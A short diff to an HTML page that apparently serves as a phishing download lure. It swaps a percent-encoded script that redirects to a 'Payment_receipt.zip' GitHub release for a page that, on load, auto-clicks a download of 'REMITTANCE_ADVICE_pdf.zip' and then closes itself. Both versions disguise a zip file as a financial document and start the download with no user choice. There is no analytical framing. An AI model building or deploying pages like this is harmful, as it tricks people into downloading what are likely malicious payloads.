@@ -1,1 +1,15 @@
-<script language=javascript>document.write(unescape('%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Cbody%3E%0A%3Cscript%3E%0Alocation.href%3D%22https%3A//github.com/chrislneswa/alldomain/releases/download/Doc/Payment_receipt.zip%22%3B%0A%3C/script%3E%0A%3C/body%3E%0A%3C/html%3E'))</script>
+<!DOCTYPE html>
+<html>
+<head>
+<title>Download</title>
+<script>
+window.onload = () => {
+  document.getElementById("download").click();
+  setTimeout(() => window.close(), 1500);
+};
+</script>
+</head>
+<body>
+<a id="download" href="https://github.com/chrislneswa/msi/releases/download/Doc/REMITTANCE_ADVICE_pdf.zip" download>Download</a>
+</body>
+</html>
